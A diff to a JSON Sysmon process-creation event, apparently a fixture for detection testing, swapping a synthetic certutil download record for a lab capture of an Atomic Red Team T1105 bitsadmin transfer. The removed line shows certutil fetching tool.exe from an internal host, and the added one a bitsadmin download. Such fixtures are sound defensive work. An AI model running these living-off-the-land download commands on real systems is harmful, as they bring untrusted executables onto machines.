@@ -1,8 +1,10 @@
 {
   "EventID": 1,
-  "Image": "C:\\Windows\\System32\\certutil.exe",
-  "CommandLine": "certutil.exe -urlcache -split -f http://10.0.0.5/tool.exe C:\\Users\\Public\\tool.exe",
+  "UtcTime": "2026-11-15 12:19:07.217",
+  "Image": "C:\\Windows\\System32\\bitsadmin.exe",
+  "CommandLine": "C:\\Windows\\System32\\bitsadmin.exe  /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\\Users\\analyst\\AppData\\Local\\Temp\\Atomic-license.txt",
   "ParentImage": "C:\\Windows\\System32\\cmd.exe",
-  "User": "VICTIM-PC\\analyst",
-  "_provenance": "synthetic"
+  "User": "WIN10-LAB\\analyst",
+  "_provenance": "real-capture",
+  "_atomic_source": "Atomic Red Team T1105 (captured via Sysmon)"
 }
